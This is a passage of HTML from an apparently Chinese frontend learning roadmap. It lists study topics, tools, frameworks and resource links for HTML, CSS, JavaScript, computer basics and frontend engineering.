href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e4%b8%80%e3%80%81%e5%89%8d%e7%ab%af%e5%85%a5%e9%97%a8">一、前端入门</a></h2><ul><li>💬 描述：学习前端基础三件套，建议从实战开始，边学边练，培养兴趣，快速入门。</li><li>📚 资源<ul><li>freeCodecamp 在线编程：<a href="https://learn.freecodecamp.one/">https://learn.freecodecamp.one/</a></li><li>阿里云前端实战学习：<a href="https://edu.aliyun.com/roadmap/frontend">https://edu.aliyun.com/roadmap/frontend</a></li><li>W3Cschool 编程入门实战：<a href="https://www.w3cschool.cn/codecamp/">https://www.w3cschool.cn/codecamp/</a></li><li>pink 老师前端入门教程：<a href="https://www.bilibili.com/video/BV14J4114768">https://www.bilibili.com/video/BV14J4114768</a></li></ul></li><li>🎯 目标：了解和实践各语言的基础语法，并能使用开发工具来独立开发一个留言板网站。<br><a name="pw4vR"></a></li></ul><h3 id="⭐️-开发工具"><a href="#⭐️-开发工具" class="headerlink" title="⭐️ 开发工具"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-%e5%bc%80%e5%8f%91%e5%b7%a5%e5%85%b7">⭐️ 开发工具</a></h3><ul><li>💬 描述：工欲善其事，必先利其器。<br><a name="NzUOS"></a></li></ul><h4 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%b5%8f%e8%a7%88%e5%99%a8">浏览器</a></h4><ul><li>⭐️ Chrome</li><li>✅ Edge</li><li>✅ Firefox</li><li>❌ Opera</li><li>Safari<br><a name="Aqzsk"></a></li></ul><h4 id="编辑器"><a href="#编辑器" class="headerlink" title="编辑器"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e7%bc%96%e8%be%91%e5%99%a8">编辑器</a></h4><ul><li>⭐️ VSCode</li><li>✅ WebStorm</li><li>Atom</li><li>⭐️ Sublime Text</li><li>HBuilder X</li><li>记事本</li><li>在线 IDE<br><a name="ZjnIf"></a></li></ul><h4 id="文档笔记"><a href="#文档笔记" class="headerlink" title="文档笔记"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%96%87%e6%a1%a3%e7%ac%94%e8%ae%b0">文档笔记</a></h4><ul><li>✅ Markdown 语法</li><li>✅ Typora</li><li>在线笔记<ul><li>语雀</li><li>腾讯文档</li><li>石墨文档</li><li>印象笔记</li></ul></li><li>Mdnice<br><a name="cy08T"></a></li></ul><h3 id="⭐️-HTML"><a href="#⭐️-HTML" class="headerlink" title="⭐️ HTML"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-html">⭐️ HTML</a></h3><ul><li>💬 描述：用于定义一个网页结构的基本技术。</li><li>📚 资源：<a href="https://developer.mozilla.org/zh-CN/docs/Learn/HTML">https://developer.mozilla.org/zh-CN/docs/Learn/HTML</a></li><li>⭐️ 基本语法</li><li>⭐️ 标签<ul><li>分区 div</li><li>标题 h1 ~ h6</li><li>段落 p</li><li>图像 img</li><li>列表 ul &#x2F; ol</li><li>超链接 a</li><li>表单 form</li><li>表格 table</li><li>框架 iframe</li></ul></li><li>⭐️ 属性</li><li>✅ HTML5 特性<ul><li>语义化标签</li><li>浏览器支持</li><li>多媒体标签</li><li>Canvas 画布</li><li>❌ 内联 SVG</li><li>本地存储<ul><li>localStorage</li><li>sessionStorage</li><li>❌ Web SQL</li></ul></li><li>Web Workers</li><li>应用缓存（Cache Manifest）</li><li>无障碍<br><a name="p9TTz"></a></li></ul></li></ul><h3 id="⭐️-CSS"><a href="#⭐️-CSS" class="headerlink" title="⭐️ CSS"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-css">⭐️ CSS</a></h3><ul><li>💬 描述：层叠样式表，用于设计风格和布局。</li><li>📚 资源：<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS">https://developer.mozilla.org/zh-CN/docs/Learn/CSS</a></li><li>⭐️ 基本语法</li><li>⭐️ 引入方式<ul><li>行内样式</li><li>内部样式表</li><li>外部样式表</li></ul></li><li>⭐️ 选择器<ul><li>通用选择器</li><li>标签选择器</li><li>id 选择器</li><li>class 选择器</li><li>属性选择器</li><li>派生选择器<ul><li>后代选择器</li><li>子元素选择器</li><li>相邻兄弟选择器</li></ul></li><li>组合选择器</li><li>伪选择器</li><li>选择器优先级</li></ul></li><li>⭐️ 属性<ul><li>单位<ul><li>px</li><li>em</li><li>rem</li><li>vw</li><li>vh</li></ul></li><li>背景</li><li>文本</li><li>字体</li><li>列表</li><li>表格</li></ul></li><li>⭐️ 文档流<ul><li>标准流</li><li>浮动流</li><li>定位流</li></ul></li><li>⭐️ 内联元素 &#x2F; 块状元素</li><li>⭐️ 盒子模型<ul><li>content</li><li>padding</li><li>border</li><li>margin</li></ul></li><li>⭐️ 浮动<ul><li>设置浮动 float</li><li>清除浮动 clear</li></ul></li><li>⭐️ 定位<ul><li>static</li><li>absolute</li><li>fixed</li><li>relative</li><li>sticky</li></ul></li><li>⭐️ 层叠规则</li><li>❗ BFC 和 IFC 机制</li><li>CSS3<ul><li>⭐️ 响应式布局<ul><li>媒体查询</li><li>Flex 布局</li><li>Grid 布局</li><li>瀑布流</li></ul></li><li>动画</li><li>过渡</li><li>渐变</li><li>背景</li><li>边框</li><li>圆角</li><li>字体</li><li>2D &#x2F; 3D 转换<br><a name="NkZQp"></a></li></ul></li></ul><h3 id="⭐️-JavaScript"><a href="#⭐️-JavaScript" class="headerlink" title="⭐️ JavaScript"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-javascript">⭐️ JavaScript</a></h3><ul><li>💬 描述：具有函数优先的轻量级，解释型或即时编译型的编程语言。</li><li>📚 资源：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript</a></li><li>⭐️ 基本语法</li><li>⭐️ 数据类型<ul><li>值类型<ul><li>字符串 String</li><li>数组 Number</li><li>布尔 Boolean</li><li>空值 Null</li><li>未定义 Undefined</li><li>Symbol</li></ul></li><li>引用类型<ul><li>对象 Object</li><li>数组 Array</li><li>函数 Function</li></ul></li></ul></li><li>✅ 数据类型转换</li><li>✅ 函数<ul><li>⭐️ 概念</li><li>⭐️ 自定义函数</li><li>调用方式<ul><li>⭐️ 全局调用</li><li>构造函数调用</li><li>⭐️ 函数方法调用</li><li>apply</li><li>call</li></ul></li><li>✅❗ 闭包</li></ul></li><li>✅ 对象<ul><li>概念</li><li>this</li><li>原型链和继承</li><li>常用对象<ul><li>数字 Number</li><li>字符串 String 对象</li><li>日期 Date 对象</li><li>数组 Array</li><li>布尔 Boolean</li><li>算数 Math</li></ul></li><li>自定义对象</li></ul></li><li>✅❗ 作用域（作用域链）</li><li>✅ BOM API</li><li>⭐️ DOM API</li><li>⭐️ JSON</li><li>⭐️ Ajax</li><li>✅ JavaScript 执行机制<br><a name="kYLu5"></a></li></ul><h4 id="✅-ES6-特性"><a href="#✅-ES6-特性" class="headerlink" title="✅ ES6+ 特性"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-es6-%e7%89%b9%e6%80%a7">✅ ES6+ 特性</a></h4><ul><li>💬 描述：新引入的 JavaScript 语法特性。</li><li>📚 资源：ES6 入门教程 <a href="https://es6.ruanyifeng.com/">https://es6.ruanyifeng.com/</a></li><li>let 和 const</li><li>变量解构赋值</li><li>对象扩展和新增方法</li><li>Symbol</li><li>Set 和 Map 数据结构</li><li>⭐️❗ Promise &amp; async &#x2F; await 异步编程</li><li>Generator 函数异步编程<br><a name="G2za2"></a></li></ul><h2 id="二、巩固基础"><a href="#二、巩固基础" class="headerlink" title="二、巩固基础"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e4%ba%8c%e3%80%81%e5%b7%a9%e5%9b%ba%e5%9f%ba%e7%a1%80">二、巩固基础</a></h2><ul><li>💬 描述：学习前端、计算机、软件开发相关基础知识，并复习巩固上阶段学到的前端三件套。</li><li>📚 资源<ul><li>《JavaScript 高级程序设计》：<a href="https://www.code-nav.cn/rd/?rid=28ee4e3e606b1e1a0e3cfd8952d172cf">https://www.code-nav.cn/rd/?rid=28ee4e3e606b1e1a0e3cfd8952d172cf</a></li><li>《JavaScript 忍者秘籍》：<a href="https://www.code-nav.cn/rd/?rid=28ee4e3e606b16c00e3c5b18609e3dc2">https://www.code-nav.cn/rd/?rid=28ee4e3e606b16c00e3c5b18609e3dc2</a></li></ul></li><li>🎯 目标：熟悉前端三件套语法，尤其是 JavaScript，并了解互联网、域名、浏览器、服务器等，扎实前端程序员的基本功，为下面进入实战开发做准备。<br><a name="jArgQ"></a></li></ul><h3 id="前端基础知识"><a href="#前端基础知识" class="headerlink" title="前端基础知识"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%89%8d%e7%ab%af%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86">前端基础知识</a></h3><ul><li>✅ 互联网</li><li>⭐️ 域名</li><li>⭐️ DNS</li><li>⭐️ 服务器</li><li>✅ 浏览器<ul><li>浏览器 DOM 事件流 &#x2F; 事件委托</li><li>⭐️ 浏览器加载顺序</li><li>⭐️ 浏览器渲染过程</li><li>浏览器事件循环</li><li>浏览器同源策略</li><li>❗ 跨域解决方案</li><li>浏览器缓存</li><li>控制台调试技巧</li></ul></li><li>✅ HTTP<ul><li>❗ HTTP 请求过程</li><li>常见 HTTP 协议<ul><li>HTTP 1.0</li><li>⭐️ HTTP 1.1</li><li>HTTP 2</li><li>HTTP 3</li></ul></li><li>⭐️ HTTP 请求类别</li><li>⭐️ 常见状态码<ul><li>1xx 信息</li><li>2xx 成功</li><li>3xx 重定向</li><li>4xx 客户端错误</li><li>5xx 服务器错误</li></ul></li><li>WebSocket</li><li>⭐️ Cookie</li><li>Session</li><li>⭐️ HTTPS<br><a name="csJde"></a></li></ul></li></ul><h3 id="计算机基础"><a href="#计算机基础" class="headerlink" title="计算机基础"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%9f%ba%e7%a1%80">计算机基础</a></h3><p><a name="JvgMr"></a></p><h4 id="✅-算法和数据结构"><a href="#✅-算法和数据结构" class="headerlink" title="✅ 算法和数据结构"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e7%ae%97%e6%b3%95%e5%92%8c%e6%95%b0%e6%8d%ae%e7%bb%93%e6%9e%84">✅ 算法和数据结构</a></h4><ul><li>⭐️ 时间 &#x2F; 空间复杂度分析</li><li>数据结构<ul><li>数组</li><li>字符串</li><li>队列</li><li>栈</li><li>链表</li><li>集合</li><li>哈希表</li><li>二叉树</li></ul></li><li>算法<ul><li>排序</li><li>双指针</li><li>查找</li><li>分治</li><li>动态规划</li><li>递归</li><li>回溯</li><li>贪心</li><li>位运算</li><li>DFS</li><li>BFS</li><li>图<br><a name="csjkH"></a></li></ul></li></ul><h4 id="✅-计算机网络"><a href="#✅-计算机网络" class="headerlink" title="✅ 计算机网络"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%bd%91%e7%bb%9c">✅ 计算机网络</a></h4><ul><li>HTTP 协议</li><li>网络模型</li><li>UDP &#x2F; TCP 协议<br><a name="Dv1E1"></a></li></ul><h4 id="✅-操作系统"><a href="#✅-操作系统" class="headerlink" title="✅ 操作系统"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f">✅ 操作系统</a></h4><ul><li>进程、线程</li><li>进程 &#x2F; 线程间通讯方式</li><li>进程调度算法</li><li>进程 &#x2F; 线程状态</li><li>死锁</li><li>内存管理<br><a name="gGQld"></a></li></ul><h3 id="软件开发基础"><a href="#软件开发基础" class="headerlink" title="软件开发基础"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e8%bd%af%e4%bb%b6%e5%bc%80%e5%8f%91%e5%9f%ba%e7%a1%80">软件开发基础</a></h3><p><a name="juRyD"></a></p><h4 id="✅-设计模式"><a href="#✅-设计模式" class="headerlink" title="✅ 设计模式"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e8%ae%be%e8%ae%a1%e6%a8%a1%e5%bc%8f">✅ 设计模式</a></h4><ul><li>单例模式</li><li>代理模式</li><li>工厂模式</li><li>装饰者模式</li><li>观察者模式</li><li>策略模式</li><li>门面模式<br><a name="uNZjV"></a></li></ul><h4 id="⭐️-Git-版本控制"><a href="#⭐️-Git-版本控制" class="headerlink" title="⭐️ Git 版本控制"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-git-%e7%89%88%e6%9c%ac%e6%8e%a7%e5%88%b6">⭐️ Git 版本控制</a></h4><ul><li>常用命令<br><a name="ZpjRV"></a></li></ul><h4 id="✅-Linux-服务器"><a href="#✅-Linux-服务器" class="headerlink" title="✅ Linux 服务器"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-linux-%e6%9c%8d%e5%8a%a1%e5%99%a8">✅ Linux 服务器</a></h4><ul><li>常用命令<br><a name="FA4ui"></a></li></ul><h4 id="✅-正则表达式"><a href="#✅-正则表达式" class="headerlink" title="✅ 正则表达式"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e6%ad%a3%e5%88%99%e8%a1%a8%e8%be%be%e5%bc%8f">✅ 正则表达式</a></h4><p><a name="OO8Pz"></a></p><h2 id="三、前端工程化"><a href="#三、前端工程化" class="headerlink" title="三、前端工程化"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e4%b8%89%e3%80%81%e5%89%8d%e7%ab%af%e5%b7%a5%e7%a8%8b%e5%8c%96">三、前端工程化</a></h2><ul><li>💬 描述：前端工程化是使用软件工程的技术和方法来进行前端的开发流程、技术、工具、经验等规范化、标准化，其主要目的为了提高开发过程中的开发效率，减少不必要的重复工作时间。</li><li>📚 资源<ul><li>什么是前端工程化？<a href="https://www.zhihu.com/question/433854153/answer/1713597311">https://www.zhihu.com/question/433854153/answer/1713597311</a></li></ul></li><li>🎯 目标：至少学会一门主流的前端开发框架（Vue &#x2F; React），并配合脚手架、组件库、工具等从 0 开始独立搭建并开发一个完整的前端网站，可以试着仿一些知名站点。要求遵循企业开发规范，将项目代码提交到代码仓库中，并独立发布上线，供他人访问。此外，建议抓住机会参与一些团队项目，感受团队开发模式和前端工程化的优势。<br><a name="ieaKF"></a></li></ul><h3 id="⭐️-研发流程"><a href="#⭐️-研发流程" class="headerlink" title="⭐️ 研发流程"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-%e7%a0%94%e5%8f%91%e6%b5%81%e7%a8%8b">⭐️ 研发流程</a></h3><ol><li>技术选型</li><li>初始化</li><li>开发</li><li>本地测试</li><li>代码提交</li><li>编译、打包、构建</li><li>部署</li><li>集成测试</li><li>发布上线</li><li>监控运维<br><a name="PKlWP"></a></li></ol><h3 id="⭐️-代码托管"><a href="#⭐️-代码托管" class="headerlink" title="⭐️ 代码托管"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-%e4%bb%a3%e7%a0%81%e6%89%98%e7%ae%a1">⭐️ 代码托管</a></h3><ul><li>💬 描述：集中存储、备份你的代码，还能和团队成员协作开发。</li><li>⭐️ GitHub</li><li>Gitee</li><li>GitLab<br><a name="xYp53"></a></li></ul><h3 id="✅-Node-JS"><a href="#✅-Node-JS" class="headerlink" title="✅ Node.JS"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-nodejs">✅ Node.JS</a></h3><ul><li>💬 描述：一个开源与跨平台的 JavaScript 运行时环境。 它是一个可用于几乎任何项目的流行工具！</li><li>📚 资源<ul><li>Node.js 官方教程：<a href="http://nodejs.cn/learn">http://nodejs.cn/learn</a></li><li>Node.js 入门：<a href="https://cnodejs.org/getstart">https://cnodejs.org/getstart</a><br><a name="sL5n3"></a></li></ul></li></ul><h4 id="⭐️-包管理"><a href="#⭐️-包管理" class="headerlink" title="⭐️ 包管理"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-%e5%8c%85%e7%ae%a1%e7%90%86">⭐️ 包管理</a></h4><ul><li>💬 描述：用于安装 Node.js 的扩展、工具等。</li><li>⭐️ npm</li><li>⭐️ yarn</li><li>❌ bower</li><li>✅ npx<br><a name="AwN3Z"></a></li></ul><h4 id="开发框架"><a href="#开发框架" class="headerlink" title="开发框架"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%bc%80%e5%8f%91%e6%a1%86%e6%9e%b6">开发框架</a></h4><ul><li>Express</li><li>Koa</li><li>Egg<br><a name="qkw99"></a></li></ul><h3 id="开发框架-1"><a href="#开发框架-1" class="headerlink" title="开发框架"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%bc%80%e5%8f%91%e6%a1%86%e6%9e%b6-1">开发框架</a></h3><ul><li>💬 描述：解决特定的问题,提高<em>开发</em>效率、简化我们的代码复杂度。<br><a name="Vg4zO"></a></li></ul><h4 id="⭐️-CSS-框架"><a href="#⭐️-CSS-框架" class="headerlink" title="⭐️ CSS 框架"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-css-%e6%a1%86%e6%9e%b6">⭐️ CSS 框架</a></h4><ul><li>✅ BootStrap</li><li>⭐️ Tailwind CSS<br><a name="NE1Ok"></a></li></ul><h4 id="⭐️-JavaScript-框架"><a href="#⭐️-JavaScript-框架" class="headerlink" title="⭐️ JavaScript 框架"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-javascript-%e6%a1%86%e6%9e%b6">⭐️ JavaScript 框架</a></h4><p><a name="GySXz"></a></p><h5 id="⭐️-Vue"><a href="#⭐️-Vue" class="headerlink" title="⭐️ Vue"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-vue">⭐️ Vue</a></h5><ul><li>Vue Router</li><li>Vuex<br><a name="qs0UB"></a></li></ul><h5 id="⭐️-React"><a href="#⭐️-React" class="headerlink" title="⭐️ React"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-react">⭐️ React</a></h5><ul><li>React DOM</li><li>React Router</li><li>Redux</li><li>MobX</li><li>React Hooks<br><a name="xI9Qf"></a></li></ul><h5 id="❌-Angular"><a href="#❌-Angular" class="headerlink" title="❌ Angular"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9d%8c-angular">❌ Angular</a></h5><ul><li>RxJS</li><li>NgRx<br><a name="MWQje"></a></li></ul><h5 id="✅-Svelte"><a href="#✅-Svelte" class="headerlink" title="✅ Svelte"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-svelte">✅ Svelte</a></h5><p><a name="Y7Wti"></a></p><h5 id="✅-UmiJS"><a href="#✅-UmiJS" class="headerlink" title="✅ UmiJS"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-umijs">✅ UmiJS</a></h5><p><a name="ml4yV"></a></p><h3 id="封装库"><a href="#封装库" class="headerlink" title="封装库"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%b0%81%e8%a3%85%e5%ba%93">封装库</a></h3><p><a name="n0TfD"></a></p><h4 id="⭐️-组件库"><a href="#⭐️-组件库" class="headerlink" title="⭐️ 组件库"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-%e7%bb%84%e4%bb%b6%e5%ba%93">⭐️ 组件库</a></h4><ul><li>✅ LayUI</li><li>⭐️ ElementUI（Vue）</li><li>✅ VantUI（Vue）</li><li>⭐️ Ant Design（React）</li><li>Material UI<br><a name="tHN35"></a></li></ul><h4 id="数据可视化"><a href="#数据可视化" class="headerlink" title="数据可视化"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%95%b0%e6%8d%ae%e5%8f%af%e8%a7%86%e5%8c%96">数据可视化</a></h4><ul><li>✅ AntV</li><li>Apache ECharts</li><li>HighCharts</li><li>D3.js<br><a name="cg5Pw"></a></li></ul><h4 id="组件（插件）"><a href="#组件（插件）" class="headerlink" title="组件（插件）"></a><a 